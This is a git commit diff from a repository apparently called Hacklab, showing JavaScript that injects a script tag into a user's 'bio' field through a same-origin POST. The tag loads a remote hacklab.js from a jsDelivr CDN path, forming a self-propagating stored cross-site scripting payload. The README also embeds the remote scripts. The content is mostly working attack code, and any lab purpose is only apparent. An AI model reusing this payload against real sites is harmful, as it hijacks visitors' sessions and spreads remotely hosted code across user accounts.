748fda6af1aadcb9b504bdb5bd6dd17f0a3fc5a4
MAXIMO <max.roc.200@gmail.com>
2025-10-05 01:06:01 -0300

    arreglo bug

--- README.md
+++ README.md
@@ -1,2 +1,3 @@
 ﻿# Hacklab
 <script src="https://cdn.jsdelivr.net/gh/Maximo-Vazquez/Hacklab@main/hacklab.js"> <script>
+<script src="https://cdn.jsdelivr.net/gh/Maximo-Vazquez/Hacklab@main/pepehabla.js"> <script>
--- pepehabla.js
+++ pepehabla.js
@@ -1,24 +1,6 @@
 (async () => {
   try {
-    const contenido_text = `(async () => {
-            try {
-                const contenido_text = 'esto es un comentario super interesante';
-
-                const body = new URLSearchParams();
-                body.append('content', contenido_text);
-                const resp = await fetch('/comment', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: body.toString(),
-                credentials: 'same-origin'
-                });
-                const text = await resp.text();
-            } catch (err) {
-                console.error(err);
-            }
-            })();'`;
+    const contenido_text = `<script src="https://cdn.jsdelivr.net/gh/Maximo-Vazquez/Hacklab@main/hacklab.js"> <script>`;
 
     const body = new URLSearchParams();
     body.append('bio', contenido_text);
